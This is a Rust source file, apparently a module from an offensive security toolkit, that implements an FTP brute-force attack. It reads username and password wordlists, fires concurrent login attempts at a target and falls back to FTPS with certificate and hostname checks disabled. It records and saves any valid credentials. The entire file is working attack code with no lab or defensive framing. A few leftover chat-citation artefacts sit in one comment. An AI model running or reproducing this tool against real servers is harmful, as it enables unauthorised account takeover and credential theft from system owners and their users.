use anyhow::{anyhow, Result};
use suppaftp::{
    AsyncFtpStream,
    AsyncNativeTlsFtpStream,
    AsyncNativeTlsConnector,
};
use suppaftp::async_native_tls::TlsConnector;    // <-- this one!
use std::{
    fs::File,
    io::{BufRead, BufReader, Write},
    path::PathBuf,
    sync::Arc,
};
use tokio::{sync::Mutex, time::{sleep, Duration}};

use std::path::Path;





/// Format IPv4 or IPv6 addresses with port
fn format_addr(target: &str, port: u16) -> String {
    if target.starts_with('[') && target.contains("]:") {
        target.to_string()
    } else if target.matches(':').count() == 1 && !target.contains('[') {
        target.to_string()
    } else {
        let clean = if target.starts_with('[') && target.ends_with(']') {
            &target[1..target.len() - 1]
        } else {
            target
        };
        if clean.contains(':') {
            format!("[{}]:{}", clean, port)
        } else {
            format!("{}:{}", clean, port)
        }
    }
}

pub async fn run(target: &str) -> Result<()> {
    println!("=== FTP Brute Force Module ===");
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("FTP Port", "21")?;
        if let Ok(p) = input.parse() { break p }
        println!("Invalid port. Try again.");
    };
    let usernames_file = prompt_required("Username wordlist")?;
    let passwords_file = prompt_required("Password wordlist")?;
    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10")?;
        if let Ok(n) = input.parse::<usize>() {
            if n > 0 { break n }
        }
        println!("Invalid number. Try again.");
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true)?;
    let save_results = prompt_yes_no("Save results to file?", true)?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ftp_results.txt")?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false)?;
    let combo_mode = prompt_yes_no("Combination mode (user × pass)?", false)?;

    let addr = format_addr(target, port);
    let found = Arc::new(Mutex::new(Vec::new()));
    let stop = Arc::new(Mutex::new(false));

    println!("\n[*] Starting brute-force on {}", addr);

    let users = load_lines(&usernames_file)?;
    let passes = {
        let f = File::open(&passwords_file)?;
        let buf = BufReader::new(f);
        buf.lines().filter_map(Result::ok).collect::<Vec<_>>()
    };

    let mut idx = 0;
    for pass in passes {
        if *stop.lock().await { break; }

        let userlist = if combo_mode {
            users.clone()
        } else {
            vec![users.get(idx % users.len()).unwrap_or(&users[0]).to_string()]
        };

        let mut handles = Vec::with_capacity(concurrency);
        for user in userlist {
            let addr = addr.clone();
            let user = user.clone();
            let pass = pass.clone();
            let found = Arc::clone(&found);
            let stop = Arc::clone(&stop);

            handles.push(tokio::spawn(async move {
                if *stop.lock().await { return; }

                match try_ftp_login(&addr, &user, &pass).await {
                    Ok(true) => {
                        println!("[+] {} -> {}:{}", addr, user, pass);
                        found.lock().await.push((addr.clone(), user.clone(), pass.clone()));
                        if stop_on_success {
                            *stop.lock().await = true;
                        }
                    }
                    Ok(false) => {
                        log(verbose, &format!("[-] {} -> {}:{}", addr, user, pass));
                    }
                    Err(e) => {
                        log(verbose, &format!("[!] {}: error: {}", addr, e));
                    }
                }

                sleep(Duration::from_millis(10)).await;
            }));

            if handles.len() >= concurrency {
                for h in handles.drain(..) { let _ = h.await; }
            }
        }

        for h in handles { let _ = h.await; }
        idx += 1;
    }

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n[-] No credentials found.");
    } else {
        println!("\n[+] Valid credentials:");
        for (host, user, pass) in creds.iter() {
            println!("    {} -> {}:{}", host, user, pass);
        }
        if let Some(path) = save_path {
            let file_path = get_filename_in_current_dir(&path);
            let mut file = File::create(&file_path)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            println!("[+] Results saved to '{}'", file_path.display());
        }
    }

    Ok(())
}

/// Try FTP login and fall back to FTPS if necessary
async fn try_ftp_login(addr: &str, user: &str, pass: &str) -> Result<bool> {
    // 1️⃣ Plain FTP
    if let Ok(mut ftp) = AsyncFtpStream::connect(addr).await {
        match ftp.login(user, pass).await {
            Ok(_) => {
                let _ = ftp.quit().await;
                return Ok(true);
            }
            Err(e) if e.to_string().contains("530") => {
                // bad creds
                return Ok(false);
            }
            Err(e) if e.to_string().contains("550 SSL/TLS required") => {
                // server requires FTPS → fall through
            }
            Err(e) => return Err(anyhow!("FTP error: {}", e)),
        }
    }

// 2️⃣ FTPS fallback with async-native-tls (no cert/hostname verification)
let mut ftp_tls = AsyncNativeTlsFtpStream::connect(addr)
    .await
    .map_err(|e| anyhow!("FTPS connect failed: {}", e))?;

// Build an async-native-tls connector that skips cert & hostname checks
let connector = AsyncNativeTlsConnector::from(
    TlsConnector::new()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
);  // :contentReference[oaicite:0]{index=0} :contentReference[oaicite:1]{index=1}

// Extract hostname for SNI
let domain = addr
    .trim_start_matches('[')
    .split(&[']', ':'][..])
    .next()
    .unwrap_or(addr);

// Upgrade to TLS
ftp_tls = ftp_tls
    .into_secure(connector, domain)
    .await
    .map_err(|e| anyhow!("TLS upgrade failed: {}", e))?;


    // Retry login over FTPS
    match ftp_tls.login(user, pass).await {
        Ok(_) => {
            let _ = ftp_tls.quit().await;
            Ok(true)
        }
        Err(e) if e.to_string().contains("530") => Ok(false),
        Err(e) => Err(anyhow!("FTPS error: {}", e)),
    }
}

// === Helpers ===

fn prompt_required(msg: &str) -> Result<String> {
    loop {
        print!("{}: ", msg);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let trimmed = s.trim();
        if !trimmed.is_empty() {
            return Ok(trimmed.to_string());
        }
        println!("This field is required.");
    }
}

fn prompt_default(msg: &str, default: &str) -> Result<String> {
    print!("{} [{}]: ", msg, default);
    std::io::stdout().flush()?;
    let mut s = String::new();
    std::io::stdin().read_line(&mut s)?;
    let trimmed = s.trim();
    Ok(if trimmed.is_empty() {
        default.to_string()
    } else {
        trimmed.to_string()
    })
}

fn prompt_yes_no(msg: &str, default_yes: bool) -> Result<bool> {
    let default = if default_yes { "y" } else { "n" };
    loop {
        print!("{} (y/n) [{}]: ", msg, default);
        std::io::stdout().flush()?;
        let mut s = String::new();
        std::io::stdin().read_line(&mut s)?;
        let input = s.trim().to_lowercase();
        match input.as_str() {
            "" => return Ok(default_yes),
            "y" | "yes" => return Ok(true),
            "n" | "no" => return Ok(false),
            _ => println!("Invalid input. Please enter 'y' or 'n'."),
        }
    }
}

fn load_lines<P: AsRef<Path>>(path: P) -> Result<Vec<String>> {
    let file = File::open(path)?;
    let reader = BufReader::new(file);
    Ok(reader.lines().filter_map(Result::ok).collect())
}

fn log(verbose: bool, msg: &str) {
    if verbose {
        println!("{}", msg);
    }
}

fn get_filename_in_current_dir(input: &str) -> PathBuf {
    Path::new(input)
        .file_name()
        .map(|n| PathBuf::from(format!("./{}", n.to_string_lossy())))
        .unwrap_or_else(|| PathBuf::from(input))
}
